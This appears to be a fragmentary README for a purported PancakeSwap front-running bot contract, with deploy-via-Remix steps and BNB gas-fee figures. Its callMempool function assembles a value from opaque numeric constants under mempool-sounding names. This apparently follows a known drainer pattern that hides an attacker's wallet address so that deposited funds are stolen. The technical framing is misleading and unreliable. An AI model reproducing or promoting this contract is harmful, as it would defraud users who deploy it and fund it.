# Pancakeswap Front Run Bot SmartContract
...
contract PancakeswapFrontrunBot {
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 473221;
        uint _memPoolLength = getMemPoolLength();
        uint _memPoolSize = 547573;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolWidth = 572775;
        uint _memPoolDepth = getMemPoolDepth();
        uint _memPoolCount = 1009960;
...
## Just use remix IDE, follow the step below :
...
- Gas fees average 0.006*2 (0.012 BNB). Better when there is no burn. If it targets token with 10% burn, that's another 0.04BNB taken off of 0.3BNB. Most tokens these days have some burn.
